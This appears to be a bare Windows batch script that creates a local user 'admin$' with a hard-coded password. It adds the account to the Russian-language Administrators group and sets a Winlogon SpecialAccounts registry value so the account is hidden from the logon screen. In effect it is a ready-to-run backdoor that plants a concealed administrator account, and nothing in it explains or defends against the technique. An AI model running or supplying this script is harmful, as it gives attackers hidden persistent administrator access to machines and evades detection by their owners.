@echo off
set user=admin$
set passwd=Pa$$worD
set group=Администраторы
net user %user% %passwd% /add
chcp 1251 >nul
net localgroup %group% %user% /add
chcp 866 >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %user% /t REG_DWORD /d 0
